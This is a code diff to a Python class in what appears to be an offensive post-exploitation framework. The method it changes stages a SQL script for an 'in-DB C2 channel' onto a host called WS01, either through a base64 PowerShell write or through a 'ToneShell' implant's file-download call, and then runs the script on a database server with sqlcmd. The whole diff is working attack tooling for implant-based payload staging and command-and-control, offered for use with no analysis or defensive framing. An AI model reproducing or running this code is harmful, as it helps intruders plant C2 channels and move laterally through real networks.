@@ -431,22 +431,23 @@ class XpMssql:
     # ── xpagent in-DB C2 channel ─────────────────────────────────────────────
 
     def cmd_xpagent_init(self, shell, timeout_s: int = 60):
-        """Stage xpagent_init.sql to WS01 and run it via sqlcmd -i on IIS01."""
-        import base64 as _b64, os as _os
-        sql_path = _os.path.join(_os.path.dirname(_os.path.abspath(__file__)), "sql", "xpagent_init.sql")
+        """Stage xpagent_init.sql to WS01 via ToneShell FILE_DOWNLOAD and run via sqlcmd -i.
+
+        Mirrors cmd_xpstage: local Python copy → payloads dir → cmd_put_wait (TS_FILE_DOWNLOAD,
+        no 1024-byte command limit) → sqlcmd -i on WS01 pointing at IIS01.
+        """
+        import shutil as _sh, os as _os
+        base  = _os.path.dirname(_os.path.abspath(__file__))
+        src   = _os.path.join(base, "sql", "xpagent_init.sql")
+        dst   = _os.path.join(base, "..", "payloads", "toneshell", "xpagent_init.sql")
         try:
-            with open(sql_path, "rb") as fh:
-                b64 = _b64.b64encode(fh.read()).decode()
+            _sh.copy2(src, dst)
         except OSError as e:
-            print(f"[!] xpagent_init: cannot read {sql_path}: {e}")
+            print(f"[!] xpagent_init: cannot copy to payloads dir: {e}")
             return
         remote_sql = r"C:\Windows\Temp\xpagent_init.sql"
-        ps_write = (
-            f"[IO.File]::WriteAllBytes('{remote_sql}',"
-            f"[Convert]::FromBase64String('{b64}'))"
-        )
-        print("[*] xpagent_init: staging SQL to WS01 ...")
-        shell.cmd_exec_raw(f'powershell -NoProfile -Command "{ps_write}"')
+        print("[*] xpagent_init: pushing SQL to WS01 ...")
+        shell.cmd_put_wait("xpagent_init.sql", remote_sql)
         print("[*] xpagent_init: running xpagent_init.sql on IIS01 ...")
         out = shell.cmd_exec_raw(f"{self._sqlcmd_prefix()} -i {remote_sql}", timeout_s=timeout_s)
         print(out)
